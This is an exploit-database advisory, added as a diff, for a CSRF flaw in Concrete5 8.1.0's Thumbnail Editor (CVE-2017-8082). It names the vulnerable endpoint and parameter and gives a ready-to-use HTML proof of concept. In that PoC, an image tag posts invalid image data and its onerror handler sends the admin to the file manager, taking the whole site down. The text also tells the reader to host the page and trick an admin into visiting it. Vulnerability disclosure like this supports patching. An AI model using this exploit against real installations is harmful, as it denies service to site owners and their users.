@@ -1,0 +1,80 @@
+id: 27708
+date: 05/03/2017
+title: concrete5 8.1.0 Thumbnail Editor CSRF Vulnerability
+author: Project Insecurity
+cves: CVE-2017-8082
+
+[+]-------------------------------------------------------------[+]
+        | Vulnerable Software:      Concrete5 CMS                       |
+        | Vendor:                   http://www.concrete5.org/           |
+        | Vulnerability Type:       CSRF to DoS (disables installation) |
+        | Date Released:            23/04/2017                          |
+        | Released by:              CDL (@sxcurity)                     |
+       [+]-------------------------------------------------------------[+]
+
+[+] Description:
+Concrete5's Thumbnail Editor in the File Manager is vulnerable to CSRF, which allows remote attackers to disable the entire
+installation of concrete5, by merely tricking an admin view a malicious page. This results in a site-wide denial of service
+meaning neither the admin OR any of the website users can acccess the site.
+
+-------------------------------------------------------------------------------------------------------------
+[+] Summary:
+The Thumbnail Editor function in the File Manager of Concrete5 allows an admin to change a thumbnail of a picture.
+However, this function does not have any CSRF tokens / any other protection from CSRF, thus allowing an attacker to
+make an admin upload a picture.
+
+If the picture is invalid, the image processor will throw an error immediately and when the admin visits the File Manager,
+a side-wide error will trigger, making the site unusable! (Example: http://archive.is/LZa5b)
+
+The vulnerable parameter is 'imgData' POST/GET param in 'http://[HOST]/index.php/tools/required/files/importers/imageeditor'
+
+So, in order to trigger this site-wide error, an attacker would first have to make the admin do 2 things.
+1.) Make the admin upload an invalid image
+2.) Make the admin visit the File Manager
+
+I came up with a proof of concept to do just that ;)
+
+[+] Proof of Concept:
+
+-------------------------------------------------------------------------------------------------------------
+<!DOCTYPE html>
+<head>
+ <title>@insecurity | CSRF PoC | concrete5 </title>
+</head>
+<body>
+ <center>
+ <h1>Project Insecurity - Concrete5 CSRF - Proof of Concept</h1>
+ <h6> Author: <a href="http://twitter.com/sxcurity">@sxcurity</a></h6>
+ <a href="http://twitter.com/insecurity">
+ <img src="http://insecurity.zone/logo.png" width="200" height="200" alt="logo" />
+ <br>
+ </a>
+
+    <!-- Performing required action to exploit the CSRF vulnerability -->
+<img 
+src="http://[HOST]/index.php/tools/required/files/importers/imageeditor?fID=1&imgData=hacktheplanet" 
+onerror=this.src="http://[HOST]/index.php/dashboard/files/search" 
+alt="GET REKT" />
+    <!-- Performing 2nd action to trigger CSRF resulting in site-wide DoS -->
+
+ <script>alert("CSRF Triggered - Site-wide DoS now in effect!");</script>
+ </center>
+</body>
+</html>
+-------------------------------------------------------------------------------------------------------------
+
+(Replace http://[HOST]/ with the URL of the Concrete5 installation you are targeting, upload the HTML somewhere, and get an admin to visit that page.)
+
+The 'src' tag uploads the invalid image data, and the onerror=this.src="" makes a new 'src' tag and makes the admin visit the file manager,
+which then triggers the site wide error.
+
+
+[+] Test it! :
+You can create a 1 hour demo of concrete5 for free (https://bitnami.com/launch/concrete5) & exploit it there!
+
+-------------------------------------------------------------------------------------------------------------
+
+[+] Fix / Patch:
+Add CSRF tokens, and make sure the image processor first validates that the uploaded image is a valid picture.
+
+#  0day.today [2023-03-22]  #
